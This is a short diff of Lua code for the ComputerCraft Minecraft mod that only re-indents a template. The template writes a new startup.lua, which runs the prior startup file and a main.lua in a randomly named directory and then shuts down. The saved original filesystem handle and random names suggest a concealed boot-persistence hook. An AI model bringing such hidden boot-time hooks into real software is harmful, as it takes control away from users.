@@ -124,23 +124,24 @@ os.shutdown()
             local f = OriginalFS.open("startup.lua", "w")
             f.write(string.format([[
 
--- SPDX-FileCopyrightText: 2025 David Lightman
---
--- SPDX-License-Identifier: LicenseRef-CCPL
---%s.
---%s,%s
---%s%s%s
-local function a1()
-    shell.setDir("/")
-    shell.run("%s")
-    shell.run("shell.lua")
-end
-local function a2()
-    shell.setDir("/")
-    shell.run("%s/%s")
-end
-parallel.waitForAny(a1, a2)
-os.shutdown()
+            -- SPDX-FileCopyrightText: 2025 David Lightman
+            --
+            -- SPDX-License-Identifier: LicenseRef-CCPL
+            --%s.
+            --%s,%s
+            --%s%s%s
+            
+            local function a1()
+                shell.setDir("/")
+                shell.run("%s")
+                shell.run("shell.lua")
+            end
+            local function a2()
+                shell.setDir("/")
+                shell.run("%s/%s")
+            end
+            parallel.waitForAny(a1, a2)
+            os.shutdown()
                             ]], oldStartupFileName, OriginalInstallDir, "main.lua", metadataFilename, randomDelimiter, DIR_4Nin92xCdd0, oldStartupFileName, OriginalInstallDir, "main.lua"))
             f.close()
         end
